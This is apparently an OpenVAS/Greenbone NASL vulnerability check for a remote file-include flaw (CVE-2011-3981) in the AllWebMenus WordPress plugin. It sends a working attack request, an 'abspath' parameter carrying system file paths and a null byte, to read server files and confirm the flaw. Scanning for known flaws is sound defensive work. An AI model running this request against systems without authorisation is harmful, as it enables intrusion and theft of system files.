# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103287");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2011-10-06 13:32:57 +0200 (Thu, 06 Oct 2011)");
  script_cve_id("CVE-2011-3981");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("WordPress AllWebMenus Plugin 'abspath' Parameter Remote File Include Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49685");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_dependencies("gb_wordpress_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_tag(name:"summary", value:"The AllWebMenus plug-in for WordPress is prone to a remote file-
 include vulnerability because it fails to sufficiently sanitize user-
 supplied input.");
  script_tag(name:"impact", value:"Exploiting this issue could allow an attacker to compromise the
 application and the underlying system. Other attacks are also
 possible.");
  script_tag(name:"affected", value:"AllWebMenus 1.1.3 is vulnerable. Other versions may also be affected.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

files = traversal_files();
url = dir + "/wp-content/plugins/allwebmenus-wordpress-menu-plugin/actions.php";
useragent = http_get_user_agent();

# nb: http_host_name() should be always after the static string(s) above but always after any
# dynamically ones (e.g. a random string) which should be different for each hostname.
host = http_host_name(port:port);

foreach file (keys(files)) {

  variables = string("abspath=/", files[file], "%00");

  req = string(
             "POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(variables),
             "\r\n\r\n",
             variables,
            "\r\n"
           );
  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

  if(egrep(pattern:file, string:result, icase:TRUE)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
